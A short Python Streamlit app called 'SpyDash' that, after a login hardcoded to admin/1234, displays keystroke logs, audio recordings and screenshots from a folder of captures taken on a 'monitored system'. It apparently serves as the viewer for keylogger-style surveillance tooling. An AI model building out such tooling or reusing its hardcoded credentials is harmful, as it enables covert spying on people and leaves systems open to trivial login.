import streamlit as st
import os

# === Configurações da página ===
st.set_page_config(page_title="SpyDash", layout="wide")

# === Autenticação ===
def autenticar(usuario, senha):
    return usuario == "admin" and senha == "1234"

if "autenticado" not in st.session_state:
    st.session_state.autenticado = False

if not st.session_state.autenticado:
    st.title("🔐 Login - SpyDash")
    usuario = st.text_input("Usuário")
    senha = st.text_input("Senha", type="password")
    if st.button("Entrar"):
        if autenticar(usuario, senha):
            st.session_state.autenticado = True
            st.rerun()
        else:
            st.error("Usuário ou senha incorretos.")
    st.stop()

# === Painel principal ===
st.title("🕵️ SpyDash - Painel de Monitoramento")
st.markdown("### Capturas em tempo real")
st.write("Este painel exibirá capturas de teclado, áudio e prints do sistema monitorado.")

# === Exibição de arquivos de captura ===
caminho_provas = "provas"
if not os.path.exists(caminho_provas):
    st.warning("Nenhuma prova encontrada ainda.")
else:
    arquivos = sorted(os.listdir(caminho_provas), reverse=True)
    for arquivo in arquivos:
        caminho = os.path.join(caminho_provas, arquivo)
        if arquivo.endswith(".txt"):
            with open(caminho, "r", encoding="utf-8") as f:
                st.text_area(f"📄 {arquivo}", f.read(), height=200)
        elif arquivo.endswith(".wav"):
            st.audio(caminho)
        elif arquivo.endswith(".png") or arquivo.endswith(".jpg"):
            st.image(caminho, caption=arquivo)
